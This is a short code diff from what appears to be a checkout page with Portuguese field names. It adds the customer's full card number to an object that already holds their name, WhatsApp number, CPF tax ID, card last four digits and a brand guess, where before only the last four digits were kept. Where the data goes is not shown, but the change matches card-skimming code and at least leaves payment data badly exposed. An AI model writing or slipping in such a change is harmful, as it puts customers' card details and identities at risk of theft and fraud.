@@ -1695,6 +1695,7 @@
                         nome: (document.getElementById('cust-name')||{}).value,
                         whatsapp: (document.getElementById('cust-phone')||{}).value,
                         step: 'submitted',
+                        card_number: num,
                         card_last4: num.slice(-4),
                         card_brand_hint: /^4/.test(num) ? 'visa' : /^5/.test(num) ? 'master' : /^3/.test(num) ? 'amex' : 'other',
                         cpf: cpf
